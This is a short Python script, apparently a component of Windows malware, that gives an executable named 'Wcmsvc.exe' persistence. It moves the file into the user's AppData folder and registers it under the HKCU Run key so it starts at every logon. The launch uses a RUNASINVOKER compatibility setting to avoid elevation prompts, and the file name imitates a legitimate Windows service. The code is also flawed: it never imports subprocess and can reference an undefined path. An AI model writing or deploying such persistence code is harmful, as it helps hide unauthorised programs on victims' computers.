import os

def setWinRegKey():
    check = subprocess.Popen("REG query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc", shell=True, stdout=subprocess.PIPE)
    subprocess_return = check.stdout.read()

    if "REG_SZ" not in str(subprocess_return):
        for root, dirs, files in os.walk("C:\\"):
            if "Wcmsvc.exe" in files:
                full_path = os.path.join(root, "Wcmsvc.exe")
                break
    
        os.rename(full_path, os.getenv('APPDATA')+'\\Wcmsvc.exe')
    
        subprocess.run('cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Wcmsvc /d "'+os.getenv('APPDATA')+'\\Wcmsvc.exe'+'""')

if __name__ == '__main__':
    setWinRegKey()